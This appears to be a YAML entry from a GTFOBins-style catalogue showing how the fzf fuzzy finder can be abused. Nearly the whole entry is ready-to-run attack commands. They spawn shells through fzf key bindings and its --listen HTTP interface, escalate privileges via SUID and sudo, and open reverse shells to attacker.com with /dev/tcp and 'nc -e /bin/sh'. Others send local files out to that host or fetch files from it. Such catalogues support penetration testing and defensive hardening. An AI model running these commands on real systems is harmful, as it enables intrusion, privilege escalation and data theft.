---
functions:
  shell:
    - description: Press ``<Enter>`` when you enter the fzf panel to receive the shell.
      code: fzf --bind "enter:execute(/bin/sh)"
  command:
    - code: |
        export COMMAND='id'
        fzf --bind "enter:execute($COMMAND)"
    - description: Set up port forwarding via SSH or Chisel using ``$LPORT``.
      code: |
        export LPORT=7777
        export COMMAND='id'
        fzf --listen=$LPORT
        curl -X POST localhost:$LPORT -d "reload($COMMAND)" # Attacker box
  reverse-shell:
    - description: Run ``nc -l -p 12345`` on the attacker box, then press ``<Enter>`` in the fzf panel to receive the shell.
      code: |
        export RHOST=attacker.com
        export RPORT=12345
        fzf --bind "enter:execute(/bin/sh -i >& /dev/tcp/$RHOST/$RPORT 0>&1)"
    - description: Set up port forwarding via SSH or Chisel using ``$LPORT``, then run ``nc -l -p 12345`` on the attacker box to receive the shell. It only works with the traditional version of ``nc``.
      code: |
        export RHOST=attacker.com
        export RPORT=12345
        export LPORT=7777
        fzf --listen=$LPORT
        curl -X POST localhost:$LPORT -d "reload(nc $RHOST $RPORT -e /bin/sh)" # Attacker box
  file-upload:
    - description: Send local file using a TCP connection. Run ``nc -l -p 12345 > "file_to_save"`` on the attacker box to collect the file.
      code: |
        export RHOST=attacker.com
        export RPORT=12345
        export LFILE=file_to_send
        fzf --bind "enter:execute(cat $LFILE > /dev/tcp/$RHOST/$RPORT)"
    - description: Set up port forwarding via SSH or Chisel using ``$LPORT``, then run ``nc -l -p 12345 > "file_to_save"`` on the attacker box to collect the file.
      code: |
        export RHOST=attacker.com
        export RPORT=12345
        export LPORT=7777
        export LFILE=file_to_send
        fzf --listen=$LPORT
        curl -X POST localhost:$LPORT -d "reload(cat $LFILE > /dev/tcp/$RHOST/$RPORT)" # Attacker box
  file-download:
    - description: Fetch remote file using a TCP connection. Run ``nc -l -p 12345 < "file_to_send"`` on the attacker box to send the file.
      code: |
        export RHOST=attacker.com
        export RPORT=12345
        export LFILE=file_to_get
        fzf --bind "enter:execute(cat < /dev/tcp/$RHOST/$RPORT > $LFILE)"
    - description: Set up port forwarding via SSH or Chisel using ``$LPORT``, then run ``nc -l -p 12345 < "file_to_send"`` on the attacker box to send the file.
      code: |
        export RHOST=attacker.com
        export RPORT=12345
        export LPORT=7777
        export LFILE=file_to_get
        fzf --listen=$LPORT
        curl -X POST localhost:$LPORT -d "reload(cat < /dev/tcp/$RHOST/$RPORT > $LFILE)" # Attacker box
  file-write:
    - description: Press ``<Enter>`` and then ``<Esc>`` when you enter the fzf panel to write the file.
      code: |
        export LFILE=file_to_write
        fzf --bind "enter:execute(echo 'DATA' > $LFILE)"
    - description: Set up port forwarding via SSH or Chisel using ``$LPORT``.
      code: |
        export LPORT=7777
        export LFILE=file_to_write
        fzf --listen=$LPORT
        curl -X POST localhost:$LPORT -d "reload(echo 'DATA' > $LFILE)" # Attacker box
  file-read:
    - description: Press ``<Enter>`` and then ``<Esc>`` when you enter the fzf panel to read the file.
      code: |
        export LFILE=file_to_read
        fzf --bind "enter:execute(/bin/cat $LFILE)"
    - description: Set up port forwarding via SSH or Chisel using ``$LPORT``.
      code: |
        export LPORT=7777
        export LFILE=file_to_read
        fzf --listen=$LPORT
        curl -X POST localhost:$LPORT -d "reload(/bin/cat $LFILE)" # Attacker box
  suid:
    - description: Press ``<Enter>`` when you enter the fzf panel to receive the shell. It only works on Ubuntu.
      code: ./fzf --bind "enter:execute(/bin/sh)"
    - description: Set up port forwarding via SSH or Chisel using ``$LPORT``, then run ``nc -l -p 12345`` on the attacker box to receive the shell. It only works on Ubuntu and with the traditional version of ``nc``.
      code: |
        export RHOST=attacker.com
        export RPORT=12345
        export LPORT=7777
        ./fzf --listen=$LPORT
        curl -X POST localhost:$LPORT -d "reload(nc $RHOST $RPORT -e /bin/sh)" # Attacker box
  sudo:
    - description: Press ``<Enter>`` when you enter the fzf panel to receive the shell.
      code: sudo fzf --bind "enter:execute(/bin/sh)"
    - description: Set up port forwarding via SSH or Chisel using ``$LPORT``, then run ``nc -l -p 12345`` on the attacker box to receive the shell. It only works with the traditional version of ``nc``.
      code: |
        export RHOST=attacker.com
        export RPORT=12345
        export LPORT=7777
        sudo fzf --listen=$LPORT
        curl -X POST localhost:$LPORT -d "reload(nc $RHOST $RPORT -e /bin/sh)" # Attacker box
---
